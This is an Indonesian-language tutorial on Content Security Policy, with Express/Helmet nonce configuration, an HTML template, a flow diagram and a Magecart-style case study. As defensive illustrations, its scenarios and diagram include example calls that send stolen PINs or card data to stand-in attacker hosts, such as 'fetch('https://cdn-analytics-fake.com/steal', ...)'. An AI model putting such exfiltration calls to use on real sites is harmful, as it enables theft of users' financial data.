# Content Security Policy (CSP)

## 1. Skenario Sistem Nyata

Sebuah portal perbankan online secara tidak sengaja memuat skrip iklan pihak ketiga yang telah disusupi oleh hacker melalui teknik *Ad Injection*. Skrip tersebut mencoba menyuntikkan elemen `<script>` inline baru ke dalam DOM untuk membaca formulir nomor PIN transfer dana dan mengirimkannya ke `https://exfiltration-server.xyz/log`.

Namun, upaya penyerang tersebut langsung gagal total di level browser engine. Browser menolak menjalankan skrip inline tersebut dan membatalkan koneksi network ke `exfiltration-server.xyz`, sambil mencetak pesan error di DevTools:
`Refused to execute inline script because it violates the following Content Security Policy directive: "script-src 'self' 'nonce-rAnd0m123'"... Refused to connect to 'https://exfiltration-server.xyz/log' because it violates the document's Content Security Policy.`

Penyelamat sistem ini adalah konfigurasi HTTP response header **Content Security Policy (CSP)**.

## 2. Apa Itu dan Buat Apa?

Content Security Policy (CSP) adalah standar keamanan web berbasis HTTP response header yang memungkinkan pemilik situs menentukan daftar sumber daya (origin) yang sah dan diizinkan untuk dimuat atau dieksekusi oleh browser.

Sumber daya ini mencakup JavaScript, stylesheet CSS, gambar, iframe, font, media audio/video, dan koneksi jaringan AJAX/WebSocket.

Fungsi utama CSP adalah sebagai **benteng pertahanan berlapis (defense-in-depth)** terhadap serangan Cross-Site Scripting (XSS), Data Injection, Packet Sniffing, dan Clickjacking.

## 3. Kenapa Harus Pakai Ini?

Meskipun developer sudah berusaha keras melakukan sanitasi input dan validasi data, bug keamanan manusiawi tetap bisa terjadi pada basis kode yang besar atau melalui supply-chain library npm.

Tanpa CSP:
- Jika ada celah XSS sekecil apapun di halaman aplikasi, browser akan dengan patuh mengeksekusi skrip apapun yang disuntikkan penyerang.
- Skrip penyerang bebas membuka koneksi network keluar (exfiltrasi) ke server mana pun di internet untuk mengirimkan data sensitif pengguna.

Dengan CSP:
- Browser menolak mengeksekusi skrip inline (`<script>...</script>` atau atribut `onclick=...`) kecuali skrip tersebut memiliki atribut kriptografis `nonce` atau hash yang cocok.
- Browser membatasi domain tujuan panggilan network (`connect-src`), sehingga meskipun skrip jahat berhasil lolos, skrip tersebut tidak bisa mengirimkan data curian keluar dari domain yang diizinkan.

## 4. Cara Kerjanya

Berikut adalah diagram alur bagaimana browser mengevaluasi instruksi CSP yang dikirimkan oleh web server:

```
[ Web Server ] 
      |
      |--- 1. HTTP 200 OK -----------------------------------------> [ Browser ]
      |    Content-Security-Policy:                                     |
      |      default-src 'self';                                        |
      |      script-src 'self' https://trusted-cdn.com 'nonce-abc123';  |
      |      connect-src 'self' https://api.mybank.com;                 |
      |      report-uri /api/csp-report;                                |
      |                                                                 |
                                        +-------------------------------+-------------------------------+
                                        |                                                               |
                             (Eksekusi Elemen DOM)                                            (Koneksi Network)
                                        |                                                               |
                     +------------------+------------------+                          +-----------------+-----------------+
                     |                                     |                          |                                   |
           <script src="app.js">            <script>eval()</script>             fetch('https://api...')            fetch('https://evil.com')
                     |                                     |                          |                                   |
              [ DIPERBOLEHKAN ]                    [ DIBLOKIR BROWSER ]                [ DIPERBOLEHKAN ]                  [ DIBLOKIR BROWSER ]
           (Cocok dengan 'self')                 (Inline script ditolak)         (Cocok connect-src)               (Tidak terdaftar di whitelist)
                                                           |                                                              |
                                                           +------------------------------+-------------------------------+
                                                                                          |
                                                                           Kirim Laporan Pelanggaran JSON
                                                                                          |
                                                                                          v
                                                                             POST /api/csp-report (Server)
```

## 5. Cuplikan Logika Inti

### Konfigurasi Header CSP di Server (Node.js Express dengan Helmet)

Di production, CSP diterapkan melalui header HTTP menggunakan library keamanan seperti `helmet`:

```typescript
// backend/src/middleware/securityHeaders.ts
import express from 'express';
import helmet from 'helmet';
import crypto from 'crypto';

const app = express();

// Generate unique cryptographic nonce untuk setiap HTTP request
app.use((req, res, next) => {
  res.locals.cspNonce = crypto.randomBytes(16).toString('base64');
  next();
});

app.use((req, res, next) => {
  helmet.contentSecurityPolicy({
    directives: {
      defaultSrc: ["'self'"],
      // Izinkan skrip dari domain sendiri dan skrip inline yang memiliki nonce sah
      scriptSrc: ["'self'", `'nonce-${res.locals.cspNonce}'`, 'https://cdn.jsdelivr.net'],
      styleSrc: ["'self'", "'unsafe-inline'"], // unsafe-inline untuk style sering dibutuhkan CSS-in-JS
      imgSrc: ["'self'", 'data:', 'https://images.unsplash.com'],
      connectSrc: ["'self'", 'https://api.perusahaan.com'],
      fontSrc: ["'self'", 'https://fonts.gstatic.com'],
      objectSrc: ["'none'"],               // Matikan plugin Flash/Java applet lama
      frameAncestors: ["'none'"],          // Anti-Clickjacking: halaman tidak boleh di-iframe
      baseUri: ["'self'"],                 // Mencegah manipulasi tag <base>
      formAction: ["'self'"],              // Form hanya boleh di-submit ke domain sendiri
      reportUri: '/api/v1/security/csp-reports', // Endpoint pelaporan insiden
    },
  })(req, res, next);
});
```

### Implementasi Nonce di Frontend SSR (Next.js / Express HTML Template)

```html
<!-- Server merender nonce yang sama ke tag HTML -->
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Portal Transaksi Aman</title>
  <!-- Skrip inline ini aman dieksekusi karena nonce-nya cocok persis dengan header CSP -->
  <script nonce="<%= cspNonce %>">
    window.__APP_CONFIG__ = { apiBase: "https://api.perusahaan.com" };
  </script>
</head>
<body>
  <div id="root"></div>
</body>
</html>
```

## 6. Kelebihan dan Kekurangan (Trade-offs)

| Kelebihan | Kekurangan / Risiko |
| :--- | :--- |
| Mencegah eksekusi payload XSS dan kebocoran data secara signifikan di tingkat browser engine | Implementasi awal sangat menantang dan rawan merusak fungsionalitas UI jika whitelist terlalu ketat |
| Melindungi aplikasi dari skrip pihak ketiga (third-party ads / trackers) yang nakal | Banyak library CSS-in-JS atau analytics lama bergantung pada inline script atau `eval()` |
| Memberikan laporan otomatis (*violation telemetry*) ketika terjadi serangan atau bug | Memerlukan infrastruktur backend khusus untuk mengumpulkan dan menyaring log violation report |

## 7. Kapan Harus Pakai vs Kapan Jangan Pakai

### Kapan Harus Pakai
- Seluruh aplikasi web production, terutama aplikasi perbankan, e-commerce, portal kesehatan, dan SaaS multi-tenant.
- Situs yang memproses data sensitif pengguna (password, data finansial, rekam medis).
- Aplikasi yang memanfaatkan dependensi JavaScript pihak ketiga dari CDN publik.

### Kapan Mode Report-Only Digunakan Terlebih Dahulu
- Saat pertama kali mengadopsi CSP pada aplikasi warisan (*legacy codebase*). Gunakan header `Content-Security-Policy-Report-Only` terlebih dahulu. Browser tidak akan memblokir resource, melainkan hanya mengirim laporan pelanggaran ke server untuk diaudit oleh tim pengembang.

## 8. Metrik Kunci & Observabilitas

1. **CSP Violation Rate per Hour**: Jumlah payload pelanggaran CSP yang masuk ke endpoint pelaporan. Lonjakan drastis menandakan serangan aktif atau rilis kode baru yang memuat resource tanpa nonce.
2. **Blocked External Domains**: Daftar domain tidak dikenal yang paling sering diblokir oleh directive `connect-src` atau `script-src`.
3. **Coverage of Nonced Scripts**: Persentase skrip inline di aplikasi yang telah berhasil dimigrasikan menggunakan nonce atau file berekstensi `.js` eksternal.

## 9. Studi Kasus Industri Nyata

Sebuah platform ticketing konser internasional mengalami insiden di mana script chatbot customer service pihak ketiga disusupi oleh hacker (Magecart attack). Hacker mengubah skrip chatbot tersebut untuk membaca input kartu kredit saat checkout dan mengirimkannya ke `https://cdn-analytics-fake.com`.

Namun, pada platform ticketing tersebut, tim engineering telah mengaktifkan CSP yang ketat:
`connect-src 'self' https://api.ticket.com;`

Ketika skrip berbahaya mencoba melakukan `fetch('https://cdn-analytics-fake.com/steal', ...)` dari browser pembeli tiket, browser memblokir request tersebut seketika karena origin tidak terdaftar di `connect-src`. Tim sekuriti tiket menerima ribuan violation report dalam 10 menit pertama dan berhasil menghentikan integrasi chatbot tersebut sebelum data nasabah bocor.

## 10. Fakta Menarik & Gotchas Production

- **Bahaya `'unsafe-inline'` dan `'unsafe-eval'`**: Jika Anda menyertakan `'unsafe-inline'` di dalam directive `script-src`, Anda pada dasarnya mematikan fungsi proteksi XSS dari CSP. Hindari ini dengan menggunakan pendekatan *Strict CSP* berbasis nonce.
- **Kasus Google Analytics & GTM**: Mengintegrasikan Google Tag Manager (GTM) dengan CSP ketat membutuhkan teknik khusus (nonce forwarding) karena GTM secara dinamis menyuntikkan skrip pihak ketiga ke halaman Anda.
- **Dua Jenis Header**: CSP dapat disetel via HTTP Header atau `<meta http-equiv="Content-Security-Policy" content="...">`. Namun, beberapa directive penting seperti `frame-ancestors` dan `report-uri` **tidak didukung** di dalam meta tag HTML dan wajib dikirim melalui HTTP header server.

## 11. Rangkuman Singkat

Content Security Policy (CSP) adalah header keamanan HTTP yang membatasi sumber resource (skrip, gaya, gambar, koneksi data) yang diizinkan untuk dimuat oleh browser. Dengan menerapkan CSP berbasis nonce dan membatasi `connect-src`, aplikasi terlindungi dari eksekusi payload XSS dan eksfiltrasi data berbahaya.
